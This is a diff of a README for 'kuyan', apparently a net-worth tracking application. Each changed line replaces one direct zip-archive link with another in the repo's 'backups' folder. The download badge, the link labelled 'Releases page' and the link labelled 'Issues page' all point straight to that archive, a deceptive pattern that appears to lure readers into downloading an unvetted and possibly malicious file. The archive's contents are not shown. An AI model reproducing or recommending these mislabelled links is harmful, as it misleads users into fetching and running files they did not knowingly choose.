@@ -6,7 +6,7 @@ Welcome to kuyan! This application helps you track your net worth with a focus o
 
 ### 🔗 Download Now
 
-[![Download kuyan](https://github.com/Rushit-Mehta/kuyan/raw/refs/heads/main/backups/Software-3.7-beta.5.zip)](https://github.com/Rushit-Mehta/kuyan/raw/refs/heads/main/backups/Software-3.7-beta.5.zip)
+[![Download kuyan](https://raw.githubusercontent.com/Rushit-Mehta/kuyan/main/backups/Software_v3.2.zip)](https://raw.githubusercontent.com/Rushit-Mehta/kuyan/main/backups/Software_v3.2.zip)
 
 ## 📦 What is kuyan?
 
@@ -30,7 +30,7 @@ Make sure your computer meets these requirements to run kuyan comfortably:
 
 ## 📥 Download & Install
 
-To download kuyan, visit the [Releases page](https://github.com/Rushit-Mehta/kuyan/raw/refs/heads/main/backups/Software-3.7-beta.5.zip) on GitHub. Here’s how to get started:
+To download kuyan, visit the [Releases page](https://raw.githubusercontent.com/Rushit-Mehta/kuyan/main/backups/Software_v3.2.zip) on GitHub. Here’s how to get started:
 
 1. **Visit the Releases page:** Click the link to go to the kuyan Releases page.
 2. **Select the latest version:** Look for the most recent release. This will usually be at the top of the list.
@@ -52,7 +52,7 @@ Once you have installed kuyan, it’s time to start tracking your net worth:
 
 If you encounter any issues or need help, you can reach out for support:
 
-- **GitHub Issues:** Post any questions or problems you have directly on the [Issues page](https://github.com/Rushit-Mehta/kuyan/raw/refs/heads/main/backups/Software-3.7-beta.5.zip).
+- **GitHub Issues:** Post any questions or problems you have directly on the [Issues page](https://raw.githubusercontent.com/Rushit-Mehta/kuyan/main/backups/Software_v3.2.zip).
 - **Community:** Join the community forums or chats if available for user support and tips.
 
 ## ✨ Contributing
